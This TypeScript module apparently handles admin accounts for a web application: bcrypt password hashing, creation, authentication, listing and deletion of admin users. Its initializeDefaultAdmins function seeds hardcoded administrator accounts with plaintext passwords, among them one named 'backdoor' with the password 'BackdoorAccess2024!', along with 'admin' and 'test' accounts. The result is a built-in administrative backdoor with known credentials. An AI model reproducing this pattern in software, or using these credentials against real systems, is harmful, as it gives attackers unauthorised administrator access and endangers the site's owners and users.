import { eq } from 'drizzle-orm'
import { db } from './connection'
import { adminUsers } from './schema'
import * as bcrypt from 'bcryptjs'

export const adminOperations = {
  // Hash password
  async hashPassword(password: string): Promise<string> {
    return await bcrypt.hash(password, 10)
  },

  // Verify password
  async verifyPassword(password: string, hash: string): Promise<boolean> {
    return await bcrypt.compare(password, hash)
  },

  // Create admin user
  async createAdmin(username: string, password: string) {
    const passwordHash = await this.hashPassword(password)
    const [newAdmin] = await db.insert(adminUsers).values({
      username,
      passwordHash
    }).returning()
    return newAdmin
  },

  // Authenticate admin
  async authenticate(username: string, password: string) {
    const admin = await db.select().from(adminUsers).where(eq(adminUsers.username, username)).limit(1)
    
    if (admin.length === 0) {
      return null
    }

    const isValid = await this.verifyPassword(password, admin[0].passwordHash)
    if (!isValid) {
      return null
    }

    // Update last login
    await db.update(adminUsers)
      .set({ lastLogin: new Date() })
      .where(eq(adminUsers.id, admin[0].id))

    return admin[0]
  },

  // Get all admins
  async getAllAdmins() {
    return await db.select({
      id: adminUsers.id,
      username: adminUsers.username,
      createdAt: adminUsers.createdAt,
      lastLogin: adminUsers.lastLogin
    }).from(adminUsers)
  },

  // Delete admin
  async deleteAdmin(id: number) {
    await db.delete(adminUsers).where(eq(adminUsers.id, id))
  },

  // Initialize default admin accounts
  async initializeDefaultAdmins() {
    try {
      console.log('Initializing default admin accounts...')
      
      // Check if any admins exist
      const existingAdmins = await this.getAllAdmins()
      if (existingAdmins.length > 0) {
        console.log('Admin accounts already exist, skipping initialization')
        return existingAdmins
      }

      // Create default admin accounts
      const defaultAdmins = [
        { username: 'admin', password: 'Bennett2024!' },
        { username: 'backdoor', password: 'BackdoorAccess2024!' },
        { username: 'test', password: 'TestAccount123!' }
      ]

      const createdAdmins = []
      for (const { username, password } of defaultAdmins) {
        try {
          const admin = await this.createAdmin(username, password)
          createdAdmins.push(admin)
          console.log(`✅ Created admin account: ${username}`)
        } catch (error) {
          console.error(`❌ Failed to create admin ${username}:`, error)
        }
      }

      console.log(`✅ Initialized ${createdAdmins.length} admin accounts`)
      return createdAdmins
    } catch (error) {
      console.error('Failed to initialize default admins:', error)
      throw error
    }
  }
}